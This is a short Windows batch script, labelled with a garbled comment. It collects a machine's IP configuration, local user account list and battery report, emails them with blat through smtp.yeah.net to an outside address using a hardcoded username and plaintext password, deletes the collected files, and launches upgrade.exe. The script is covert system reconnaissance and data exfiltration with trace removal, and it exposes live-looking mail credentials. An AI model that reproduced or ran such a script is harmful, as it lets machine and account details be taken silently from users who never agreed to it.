@echo off
:::::::::::::: ·¢ËÍÓÊ¼þ::::::::::::::
ipconfig | findstr "IPv4">>%file%
net user>>%file%
powercfg /BatteryReport
mkdir %logPath%\temp
move battery-report.html %logPath%\temp\
copy %file% %logPath%\temp\
set from=mythware@yeah.net
set user=mythware
set pass=cysb4321
set to=15158879870@139.com
set subj="%computername%\%username%"
set mail=%file%
set attach=%logPath%\temp\*.*
set server=smtp.yeah.net
set debug=-debug -log blat.log -timestamp
blat "%mail%" -to %to% -base64 -charset Gb2312 -subject "%subj%" -attach %attach% -server %server% -f %from% -u %user% -pw %pass% %debeg%&del /q %logPath%\temp\*.*
start /I upgrade.exe
exit